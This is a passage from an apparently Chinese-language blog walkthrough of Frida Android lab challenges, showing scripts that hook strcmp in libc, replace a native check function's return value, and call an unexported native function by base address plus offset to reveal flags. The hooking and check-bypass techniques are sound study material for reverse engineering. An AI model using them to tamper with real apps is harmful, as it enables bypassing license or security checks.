prompt_">Landroid/view/autofill/AutofillManager$</span><span class="language-bash">AutofillClient;</span></span><br><span class="line"><span class="meta prompt_">Landroid/net/Uri$</span><span class="language-bash">HierarchicalUri;</span></span><br><span class="line">Landroid/os/UserHandle;</span><br><span class="line">Ljava/lang/Object;</span><br><span class="line"><span class="meta prompt_">Lcom/android/internal/telephony/euicc/EuiccConnector$</span><span class="language-bash">AvailableState;</span></span><br><span class="line"><span class="meta prompt_">Lcom/android/i18n/phonenumbers/Phonemetadata$</span><span class="language-bash">NumberFormat;</span></span><br><span class="line">Landroid/content/IContentProvider;</span><br><span class="line">Landroid/os/Bundle;</span><br><span class="line">Ljava/lang/String;</span><br><span class="line">Ljava/lang/String;</span><br></pre></td></tr></table></figure><p>第一个参数是我们输入的参数，那么现在进行过滤<br>现在输入hello，来确认目标地址</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> strcmp_adr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(strcmp_adr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> arg0 = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (arg0.<span class="title function_">includes</span>(<span class="string">&quot;hello&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(arg0);</span><br><span class="line">            <span class="comment">//console.log(strcmp_adr);</span></span><br><span class="line">            <span class="comment">//获取指定strcmp地址</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>现在得到的数据就只有一条</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Pixel 4::Frida 0x8 ]-&gt; hello</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后按照之前的方法获取第二个参数<code>Memory.readUtf8String(args[1]);</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> strcmp_adr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(strcmp_adr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> arg0 = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">var</span> arg1 = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span> (arg0.<span class="title function_">includes</span>(<span class="string">&quot;hello&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(arg0);</span><br><span class="line">            <span class="comment">//console.log(strcmp_adr);</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(arg1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Pixel 4::Frida 0x8 ]-&gt; hello</span><br><span class="line">FRIDA&#123;NATIVE_LAND&#125;</span><br></pre></td></tr></table></figure><h2 id="0x9-修改静态so返回值"><a href="#0x9-修改静态so返回值" class="headerlink" title="0x9 修改静态so返回值"></a>0x9 修改静态so返回值</h2><p>主要逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.a0x9;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">check_flag</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;a0x9&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    stener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;             </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (MainActivity.<span class="built_in">this</span>.check_flag() == <span class="number">1337</span>) &#123;</span><br><span class="line">                    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>so</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 Java_com_ad2001_a0x9_MainActivity_check_1flag()</span><br><span class="line">&#123;</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单的修改返回值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag_adr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;liba0x9.so&quot;</span>, <span class="string">&quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(flag_adr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;catch the flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="comment">//retval = 1337;//错误的赋值</span></span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="number">1337</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;change the result&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>模板</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(targetAddress, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Entering &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// 修改参数</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Leaving &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// 修改返回值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的函数名不是check_flag而是check_1flag,这和jni的命名规则有关，特殊转义，下划线 <code>_</code>** → <code>_1</code></p><h2 id="0xA-动态so"><a href="#0xA-动态so" class="headerlink" title="0xA 动态so"></a>0xA 动态so</h2><p>java</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">ad2001</span>.<span class="property">frida0xa</span>;</span><br><span class="line"></span><br><span class="line">public final <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_ inherited__">AppCompatActivity</span> &#123;</span><br><span class="line">    public final native <span class="title class_">String</span> <span class="title function_">stringFromJNI</span>();</span><br><span class="line">        protected <span class="keyword">void</span> <span class="title function_">onCreate</span>(<span class="params">Bundle savedInstanceState</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        activityMainBinding.<span class="property">sampleText</span>.<span class="title function_">setText</span>(<span class="title function_">stringFromJNI</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="title class_">System</span>.<span class="title function_">loadLibrary</span>(<span class="string">&quot;frida0xa&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>so</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Java_com_ad2001_frida0xa_MainActivity_stringFromJNI</span><span class="params">(_JNIEnv *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// x0</span></span><br><span class="line">  __int64 v3; <span class="comment">// [xsp+18h] [xbp-48h]</span></span><br><span class="line">  _BYTE v5[<span class="number">24</span>]; <span class="comment">// [xsp+40h] [xbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [xsp+58h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;decltype(nullptr)&gt;();</span><br><span class="line">  v1 = (<span class="type">const</span> <span class="type">char</span> *)sub_1DD3C(v5);</span><br><span class="line">  v3 = _JNIEnv::NewStringUTF(a1, v1);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v5);</span><br><span class="line">  _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面这两个主要是把文本 “Hello Hackers”显示在我们的 <code>TextView</code> 中。<br>继续找<br>然后在so这里找到了get_flag()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">get_flag</span><span class="params">(__int64 result, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+Ch] [xbp-44h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">20</span>]; <span class="comment">// [xsp+34h] [xbp-1Ch] BYREF</span></span><br><span class="line">  __int64 v4; <span class="comment">// [xsp+48h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result + a2 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; __strlen_chk(<span class="string">&quot;FPE&gt;9q8A&gt;BK-)20A-#Y&quot;</span>, <span class="number">0xFFFFFFFFFFFFFFFF</span>LL); ++i )</span><br><span class="line">      v3[i] = aFpe9q8aBk20aY[i] + <span class="number">2</span> * i;</span><br><span class="line">    v3[<span class="number">19</span>] = <span class="number">0</span>;</span><br><span class="line">    result = __android_log_print(<span class="number">3</span>, <span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;Decrypted Flag: %s&quot;</span>, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它会把最终的flag打印<code>result = __android_log_print(3, &quot;FLAG&quot;, &quot;Decrypted Flag: %s&quot;, v3);</code>在日志里</p><p>接下来分析get_flag(),两个参数相加等于3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_flag(__int64 result, <span class="type">int</span> a2)</span><br><span class="line"><span class="keyword">if</span> ( (_DWORD)result + a2 == <span class="number">3</span> )</span><br></pre></td></tr></table></figure><p>接下来就是怎么hook动态注册的函数，并且修改函数的参数值</p><p>get_flag()这个名字看起来就是动态注册的，静态注册的命名很特别：<code>Java_&#123;PackageName&#125;_&#123;ClassName&#125;_&#123;MethodName&#125;</code></p><p>尝试导出函数，它也不在可导出列表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Pixel 4::Frida 0xA ]-&gt; Module.findExportByName(&quot;libfrida0xa.so&quot;, &quot;Java_com_ad2001_frida0xa_MainActivity_stringF </span><br><span class="line">romJNI&quot;)</span><br><span class="line">&quot;0x72e0b0fbe0&quot;</span><br><span class="line">[Pixel 4::Frida 0xA ]-&gt; Module.findExportByName(&quot;libfrida0xa.so&quot;, &quot;get_flag&quot;)</span><br><span class="line">null</span><br></pre></td></tr></table></figure><p>使用0x8控制静态方法的模板不可行</p><p>这里给个新的模板</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> native_adr = <span class="keyword">new</span> <span class="title class_">NativePointer</span>(&lt;address_of_the_native_function&gt;);</span><br><span class="line"><span class="keyword">const</span> native_function = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(native_adr, <span class="string">&#x27;&lt;return type&gt;&#x27;</span>, [<span class="string">&#x27;argument_data_type&#x27;</span>]);</span><br><span class="line"><span class="title function_">native_function</span>(&lt;<span class="variable language_">arguments</span>&gt;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> native_adr = <span class="keyword">new</span> <span class="title class_">NativePointer</span>(&lt;address_of_the_native_function&gt;);</span><br></pre></td></tr></table></figure><p>要在 frida 中调用native函数，我们需要一个 <code>NativePointer</code> 对象。我们应该将要调用的原生函数的地址传递给 NativePointer 构造函数。接下来，我们将创建 <code>NativeFunction</code> 对象 ，它表示我们想要调用的实际原生函数。它围绕原生函数创建了一个 JavaScript 包装器，允许我们从 frida 调用该原生函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> native_function = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(native_adr, <span class="string">&#x27;&lt;return type&gt;&#x27;</span>, [<span class="string">&#x27;argument_data_type&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>第一个参数应该是 <code>NativePointer</code> 对象，第二个参数是原生函数的返回类型，第三个参数是要传递给原生函数的参数的数据类型列表。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">native_function</span>(&lt;<span class="variable language_">arguments</span>&gt;);</span><br></pre></td></tr></table></figure><p>接着就可以调用定义好的方法了</p><p>那么如何查找动态注册的native的地址呢？<br>打开ida查看它的偏移,可以得到偏移为0x1DD60</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000001</span>DD5C                 RET</span><br><span class="line">.text:<span class="number">000000000001</span>DD5C ; &#125; <span class="comment">// starts at 1DD3C</span></span><br><span class="line">.text:<span class="number">000000000001</span>DD5C ; End of function sub_1DD3C</span><br><span class="line">.text:<span class="number">000000000001</span>DD5C</span><br><span class="line">.text:<span class="number">000000000001</span>DD60</span><br><span class="line">.text:<span class="number">000000000001</span>DD60 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">000000000001</span>DD60</span><br><span class="line">.text:<span class="number">000000000001</span>DD60 ; Attributes: bp-based frame</span><br><span class="line">.text:<span class="number">000000000001</span>DD60</span><br><span class="line">.text:<span class="number">000000000001</span>DD60 ; __int64 __fastcall <span class="title function_">get_flag</span><span class="params">(__int64 result, <span class="type">int</span>)</span></span><br><span class="line">.text:000000000001DD60                 EXPORT _Z8get_flagii</span><br><span class="line">.text:000000000001DD60 _Z8get_flagii                           ; DATA XREF: LOAD:<span class="number">0000000000001648</span>↑o</span><br></pre></td></tr></table></figure><p>所在库就是基址<br>找到libfrida0xa.so的基址<br><code>var base = Module.findBaseAddress(&quot;libfrida0xa.so&quot;);</code><br>然后加上偏移<br><code>var flag_adr = base.add(0x1DD60);</code><br>就得到了目标地址</p><p>具体操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> flag_adr = base.<span class="title function_">add</span>(<span class="number">0x1DD60</span>);</span><br><span class="line"><span class="keyword">var</span> native_adr = <span class="keyword">new</span> <span class="title class_">NativePointer</span>(flag_adr);  <span class="comment">//创建NativePointer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建NativeFunction</span></span><br><span class="line"><span class="keyword">const</span> get_flag = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(native_adr, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="title function_">get_flag</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>在日志里看到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> :&gt;frida-ps -Uai</span><br><span class="line">  PID  Name                 Identifier</span><br><span class="line">-----  -------------------  ---------------------------------------</span><br><span class="line">19645  frida 0xA            com.ad2001.frida0xa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flame:/ # logcat | grep &quot;19645&quot;</span><br><span class="line">04-17 10:12:22.425 19645 19692 D ProfileInstaller: Installing profile for com.ad2001.frida0xa</span><br><span class="line">04-17 10:23:42.752 19645 19691 D FLAG    : Decrypted Flag: FRIDA&#123;DONT_CALL_ME&#125;</span><br><span class="line">04-17 10:23:43.537 19645 19691 D FLAG    : Decrypted Flag: FRIDA&#123;DONT_CALL_ME&#125;</span><br></pre></td></tr></table></figure><h2 id="0xB-加花的so"><a href="#0xB-加花的so" class="headerlink" title="0xB 加花的so"></a>0xB 加花的so</h2><p>主要逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ad2001.frida0xb;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">getFlag</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        btn.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; </span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                MainActivity.onCreate$lambda$<span class="number">0</span>(MainActivity.<span class="built_in">this</span>, view);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> onCreate$lambda$<span class="number">0</span>(MainActivity <span class="built_in">this</span>$<span class="number">0</span>, View it) &#123;</span><br><span class="line">        Intrinsics.checkNotNullParameter(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>$<span class="number">0.</span>getFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;frida0xb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>so</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title class_">Java</span>_com_ad2001_frida0xb_MainActivity_getFlag()</span><br><span class="line">&#123;</span><br><span class="line">  ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次的so反编译结果什么也没有<br>那么尝试手动分析其逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000015220</span></span><br><span class="line">.text:<span class="number">0000000000015220</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000015220</span>                 SUB             SP, SP, #<span class="number">0x60</span></span><br><span class="line">.text:<span class="number">0000000000015224</span>                 STP             X29, X30, [SP,#<span class="number">0x50</span>+var_s0]</span><br><span class="line">.text:<span class="number">0000000000015228</span>                 ADD             X29, SP, #<span class="number">0x50</span></span><br><span class="line">.text:<span class="number">000000000001522</span>C                 STUR            X0, [X29,#var_18]</span><br><span class="line">.text:<span class="number">0000000000015230</span>                 STUR            X1, [X29,#var_20]</span><br><span class="line">.text:<span class="number">0000000000015234</span>                 MOV             W8, #<span class="number">0xDEADBEEF</span></span><br><span class="line">.text:<span class="number">000000000001523</span>C                 STUR            W8, [X29,#var_24]</span><br><span class="line">.text:<span class="number">0000000000015240</span>                 LDUR            W8, [X29,#var_24]</span><br><span class="line">.text:<span class="number">0000000000015244</span>                 SUBS            W8, W8, #<span class="number">0x539</span></span><br><span class="line">.text:<span class="number">0000000000015248</span>                 B.NE            loc_1532C</span><br><span class="line">.text:<span class="number">000000000001524</span>C                 B               loc_15250</span><br><span class="line">.text:<span class="number">0000000000015250</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000015250</span></span><br><span class="line">.text:<span class="number">0000000000015250</span> loc_15250                               ; CODE XREF: Java_com_ad2001_frida0xb_MainActivity_getFlag+<span class="number">2</span>C↑j</span><br><span class="line">.text:<span class="number">0000000000015250</span>                 STR             XZR, [SP,#<span class="number">0x50</span>+var_30]</span><br><span class="line">.text:<span class="number">0000000000015254</span>                 ADRL            X8, aJEhmwbmxezisdm ; <span class="string">&quot;j~ehmWbmxezisdmogi~Q&quot;</span></span><br><span class="line">.text:<span class="number">000000000001525</span>C                 STR             X8, [SP,#<span class="number">0x50</span>+var_38]</span><br><span class="line">.text:<span class="number">0000000000015260</span>                 LDR             X8, [SP,#<span class="number">0x50</span>+var_38]</span><br><span class="line">.text:<span class="number">0000000000015264</span>                 STUR            X8, [X29,#var_8]</span><br><span class="line">.text:<span class="number">0000000000015268</span>                 MOV             X8, #<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">.text:<span class="number">000000000001526</span>C                 STUR            X8, [X29,#var_10]</span><br><span class="line">.text:<span class="number">0000000000015270</span>                 LDUR            X0, [X29,#var_8] ; <span class="type">char</span> *</span><br><span class="line">.text:<span class="number">0000000000015274</span>                 LDUR            X1, [X29,#var_10] ; <span class="type">size_t</span></span><br><span class="line">.text:<span class="number">0000000000015278</span>                 BL              .__strlen_chk</span><br><span class="line">.text:<span class="number">000000000001527</span>C                 STR             X0, [SP,#<span class="number">0x50</span>+var_40]</span><br><span 